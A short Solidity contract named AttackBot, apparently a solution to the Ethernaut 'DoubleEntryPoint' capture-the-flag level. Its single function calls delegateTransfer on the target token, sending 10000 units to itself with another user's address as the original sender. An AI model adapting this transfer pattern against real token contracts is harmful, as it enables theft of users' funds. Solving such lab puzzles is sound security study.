pragma solidity ^0.8.0;
interface DelegateERC20 {
    function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}
contract AttackBot {

    address public doubleEntryPoint;

    constructor(address _doubleEntryPoint) {
        doubleEntryPoint = _doubleEntryPoint;
    }

    function handleTransaction(address user, bytes calldata msgData) external {
        (bool success, ) = doubleEntryPoint.call(abi.encodeWithSelector(DelegateERC20.delegateTransfer.selector, address(this), 10000, user));
        require(success, "Call failed");
    }
}